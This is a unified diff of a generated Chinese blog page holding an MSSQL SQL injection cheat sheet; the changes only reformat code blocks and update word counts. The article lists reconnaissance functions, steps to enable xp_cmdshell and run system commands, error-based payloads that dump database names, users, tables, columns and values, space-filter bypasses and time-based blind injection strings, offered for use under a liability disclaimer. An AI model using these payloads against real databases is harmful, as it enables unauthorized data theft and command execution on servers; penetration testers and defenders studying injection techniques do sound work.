@@ -419,7 +419,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    719
+                    672
                 </div>
                 
 
@@ -445,23 +445,44 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p>
-<h2 id="一、常用函数"><a href="#一、常用函数" class="headerlink" title="一、常用函数"></a>一、常用函数</h2><h2 id="一、常见函数"><a href="#一、常见函数" class="headerlink" title="一、常见函数"></a>一、常见函数</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--（后面没有空格）					# 注释符</span>
-<span class="token comment">/**/</span>										 <span class="token comment"># 多行注释</span>
-<span class="token keyword">select</span> @<span class="token variable">@version</span>												<span class="token comment"># 查询数据库的版本</span>
-<span class="token keyword">select</span> @<span class="token variable">@servername</span>											<span class="token comment"># 查询当数据库所在服务器的服务名</span>
-<span class="token keyword">select</span> host_name<span class="token punctuation">(</span><span class="token punctuation">)</span>											<span class="token comment"># 查询当前连接sqlserver主机的主机名</span>
-<span class="token keyword">select</span> <span class="token keyword">user</span>															<span class="token comment"># 查询数据库用户名</span>
-<span class="token keyword">select</span> <span class="token keyword">system_user</span>											<span class="token comment"># 查询当前客户端登录MSSQL服务器所使用的用户名（默认为：sa）</span>
+<h2 id="一、常用函数"><a href="#一、常用函数" class="headerlink" title="一、常用函数"></a>一、常用函数</h2><h2 id="一、常见函数"><a href="#一、常见函数" class="headerlink" title="一、常见函数"></a>一、常见函数</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 注释符</span>
+<span class="token comment">--					</span>
+<span class="token comment">/**/</span>
+
+<span class="token comment"># 查询数据库的版本</span>
+<span class="token keyword">select</span> @<span class="token variable">@version</span>
+
+<span class="token comment"># 查询当数据库所在服务器的服务名</span>
+<span class="token keyword">select</span> @<span class="token variable">@servername</span>
+
+<span class="token comment"># 查询当前连接sqlserver主机的主机名</span>
+<span class="token keyword">select</span> host_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 查询数据库用户名</span>
+<span class="token keyword">select</span> <span class="token keyword">user</span>
+<span class="token keyword">select</span> <span class="token keyword">system_user</span>
 <span class="token keyword">select</span> user_name<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 <span class="token keyword">select</span> suser_name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>suser_sname<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">select</span> <span class="token keyword">current_user</span>
-<span class="token keyword">select</span> db_name<span class="token punctuation">(</span><span class="token punctuation">)</span>          							<span class="token comment"># 查询当前数据库名称</span>
-<span class="token keyword">select</span> db_name<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>         							<span class="token comment"># 查询第一个数据库的名称</span>
-<span class="token keyword">top</span> n                   								<span class="token comment"># 查询前n条记录，MSSQL是不支持limit查询的</span>
-<span class="token keyword">select</span> <span class="token function">len</span><span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">)</span>               			<span class="token comment"># 查询给定字符串的长度</span>
-<span class="token keyword">select</span> substring<span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>     			<span class="token comment"># 截取给定字符串的索引为2的1个字符</span>
-<span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>                  			<span class="token comment"># 查询给定字符串的ascii值</span>
-<span class="token keyword">select</span> is_srvrolemember<span class="token punctuation">(</span><span class="token string">'sysadmin'</span><span class="token punctuation">)</span>     <span class="token comment"># 是为：1，不是为：0，常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<span class="token comment"># 查询数据库名称</span>
+<span class="token keyword">select</span> db_name<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">select</span> db_name<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 查询前n条记录，MSSQL是不支持limit查询的</span>
+<span class="token keyword">top</span> n
+
+<span class="token comment"># 查询给定字符串的长度</span>
+<span class="token keyword">select</span> <span class="token function">len</span><span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 截取给定字符串的索引为2的1个字符</span>
+<span class="token keyword">select</span> substring<span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 查询给定字符串的ascii值</span>
+<span class="token keyword">select</span> ascii<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 是为：1，不是为：0，常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</span>
+<span class="token keyword">select</span> is_srvrolemember<span class="token punctuation">(</span><span class="token string">'sysadmin'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="二、注入姿势总结"><a href="#二、注入姿势总结" class="headerlink" title="二、注入姿势总结"></a>二、注入姿势总结</h2><h3 id="1、开-xp-cmdshell-执行命令"><a href="#1、开-xp-cmdshell-执行命令" class="headerlink" title="1、开 xp_cmdshell 执行命令"></a>1、开 xp_cmdshell 执行命令</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>、第一种方法
 <span class="token keyword">execute</span><span class="token punctuation">(</span><span class="token string">'sp_configure "show advanced options",1'</span><span class="token punctuation">)</span>
@@ -478,51 +499,71 @@
 <span class="token keyword">exec</span> xp_cmdshell <span class="token string">'whoami'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="2、报错注入"><a href="#2、报错注入" class="headerlink" title="2、报错注入"></a>2、报错注入</h3><p>（1）猜解表名和列名</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">--            											  # 爆出当前的表名和第一个列名</span>
-<span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>第一个列名<span class="token punctuation">]</span> <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>     						 <span class="token comment"># 爆出当前的表名和第二个列名</span>
-<span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>第一个列名<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>第二个列名<span class="token punctuation">]</span> <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>      <span class="token comment"># 爆出当前的表名和第三个列名</span>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 爆出当前的表名和第一个列名</span>
+<span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">--</span>
 
-依次类推，获取当前使用表所有列名。。。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment"># 爆出当前的表名和第二个列名</span>
+<span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>第一个列名<span class="token punctuation">]</span> <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
+
+<span class="token comment"># 爆出当前的表名和第三个列名</span>
+<span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>第一个列名<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>第二个列名<span class="token punctuation">]</span> <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
+
+依次类推，获取当前使用表所有列名。。。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>（2）获取数据库名、用户名</p>
 <pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">and/**/1=convert(int,user_name())--
+
 and+1=user
+
 and+'/*'='/*'+and+1=user--*/
+
 and+1=(db_name/**/()%1e%1e)%1e%1e--
+
 1'^db_name()/0--
+
 1'&amp;1/system_user--
+
 1'|db_name()/0--
+
 1'^~1/db_name()--
+
 1|^-1/db_name()--
+
 1^~1/db_name()--
+
 1'or~1/db_name()='1
-1'or+user/0='1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+1'or+user/0='1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>（3）空格替换</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">[</span><span class="token number">0x01</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">]</span>
-<span class="token comment">/**/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<span class="token comment">/**/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>（4）获取具体值</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>、获取当前数据库名
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 1、获取当前数据库名</span>
 
-<span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span>、获取指定数据库的所有表名
+<span class="token comment"># 2-1、获取指定数据库的所有表名</span>
 <span class="token operator">oR</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SelEct</span><span class="token operator">+</span>quotename<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">fRom</span><span class="token operator">+</span><span class="token operator">&lt;</span>当前数据库名<span class="token operator">&gt;</span><span class="token operator">+</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token punctuation">.</span><span class="token operator">+</span>sysobjects<span class="token operator">+</span><span class="token keyword">wHerE</span><span class="token operator">+</span>xtype<span class="token operator">=</span><span class="token string">'U'</span><span class="token operator">+</span><span class="token keyword">FOR</span><span class="token operator">+</span>XML<span class="token operator">+</span>PATH<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span>
 
-<span class="token number">2</span><span class="token operator">-</span><span class="token number">2</span>、一个一个查询数据库表
+<span class="token comment"># 2-2、一个一个查询数据库表</span>
 <span class="token operator">oR</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SelEct</span><span class="token operator">+</span><span class="token keyword">top</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span>taBle_nAme<span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>infOrmatiOn_sChema<span class="token operator">+</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token keyword">tAbles</span><span class="token operator">+</span><span class="token keyword">where</span><span class="token operator">+</span>taBle_nAme<span class="token operator">+</span><span class="token operator">not</span><span class="token operator">+</span><span class="token operator">in</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span>
 
-<span class="token number">3</span>、获取指定表的所有列名
+<span class="token comment"># 3、获取指定表的所有列名</span>
 <span class="token operator">oR</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SelEct</span><span class="token operator">+</span>quotename<span class="token operator">+</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">fRom</span><span class="token operator">+</span><span class="token operator">&lt;</span>当前数据库名<span class="token operator">&gt;</span><span class="token operator">+</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token punctuation">.</span><span class="token operator">+</span>syscolumns<span class="token operator">+</span><span class="token keyword">wHerE</span><span class="token operator">+</span>id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">selEct</span><span class="token operator">+</span>id<span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span><span class="token operator">&lt;</span>当前数据库名<span class="token operator">&gt;</span><span class="token operator">+</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token punctuation">.</span><span class="token operator">+</span>sysobjects<span class="token operator">+</span><span class="token keyword">wHerE</span><span class="token operator">+</span>name<span class="token operator">=</span><span class="token string">'&lt;指定表名&gt;'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">foR</span><span class="token operator">+</span>XML<span class="token operator">+</span>PATH<span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span>
 
-<span class="token number">4</span>、获取具体值
+<span class="token comment"># 4、获取具体值</span>
 <span class="token operator">oR</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SelEct</span><span class="token operator">+</span><span class="token keyword">tOp</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">&lt;</span>列名<span class="token operator">&gt;</span><span class="token operator">+</span><span class="token keyword">fRom</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>表名<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">--</span>
 <span class="token operator">oR</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SelEct</span><span class="token operator">+</span><span class="token keyword">tOp</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">&lt;</span>列名<span class="token operator">&gt;</span><span class="token operator">+</span><span class="token keyword">fRom</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">&lt;</span>表名<span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token keyword">where</span><span class="token operator">+</span><span class="token operator">&lt;</span>列名<span class="token operator">&gt;</span><span class="token operator">+</span><span class="token operator">not</span><span class="token operator">+</span><span class="token operator">in</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">'&lt;具体值&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="3、时间盲注"><a href="#3、时间盲注" class="headerlink" title="3、时间盲注"></a>3、时间盲注</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#如果if中的条件满足，则睡5秒</span>
+<h3 id="3、时间盲注"><a href="#3、时间盲注" class="headerlink" title="3、时间盲注"></a>3、时间盲注</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 如果if中的条件满足，则睡5秒</span>
 <span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">WAITFOR</span><span class="token operator">+</span>DELAY<span class="token operator">+</span><span class="token string">'0:0:5'</span><span class="token comment">--+</span>
+
 <span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>db_name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">like</span><span class="token operator">+</span><span class="token string">'s%'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">WAITFOR</span><span class="token operator">+</span>DELAY<span class="token operator">+</span><span class="token string">'0:0:5'</span><span class="token comment">--+</span>
+
 <span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">WAITFOR</span><span class="token operator">+</span>DELAY<span class="token operator">+</span><span class="token string">'0:0:2'</span><span class="token comment">--+</span>
-<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">WAITFOR</span><span class="token operator">+</span>DELAY<span class="token operator">+</span><span class="token string">'0:0:5'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">WAITFOR</span><span class="token operator">+</span>DELAY<span class="token operator">+</span><span class="token string">'0:0:5'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
                 
@@ -1211,7 +1252,7 @@ and+1=(db_name/**/()%1e%1e)%1e%1e--
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">19.3k</span>
+                        class="white-color">19.2k</span>
             
             
             
